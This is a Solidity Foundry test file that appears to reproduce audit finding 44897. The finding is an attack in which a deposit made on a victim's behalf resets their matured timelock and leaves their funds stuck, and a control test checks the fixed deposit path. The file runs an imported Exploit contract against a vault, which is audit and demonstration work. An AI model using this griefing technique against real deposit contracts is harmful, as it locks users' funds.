// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit, Asset, Water, Depositor} from "./44897-an-attacker-can-make-victims-deposit-be-locked-forever-zokyo.sol";

contract Finding44897Test is Test {
    function test_deposit_resets_the_mature_lock() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.water().assets(address(e.victim())), 1001, "still deposited");
        assertEq(e.token().balanceOf(address(e.victim())), 0, "nothing out");
        assertEq(e.water().userTimelock(address(e.victim())), block.timestamp + 30 days, "reset");
        console2.log("assets stuck", e.water().assets(address(e.victim())));
        console2.log("timelock", e.water().userTimelock(address(e.victim())));
    }

    function test_control_does_not_extend_a_mature_lock() public {
        Asset token = new Asset();
        Water water = new Water(token);
        Depositor victim = new Depositor();
        token.mint(address(water), 1000);
        water.seedMatured(address(victim), 1000);
        token.mint(address(this), 1);
        token.approve(address(water), 1);
        water.depositFixed(1, address(victim));
        assertEq(water.userTimelock(address(victim)), block.timestamp, "still mature");
        victim.withdraw(water, 1000);
        assertEq(token.balanceOf(address(victim)), 1000, "victim withdrew");
        console2.log("control withdrawn", token.balanceOf(address(victim)));
    }
}
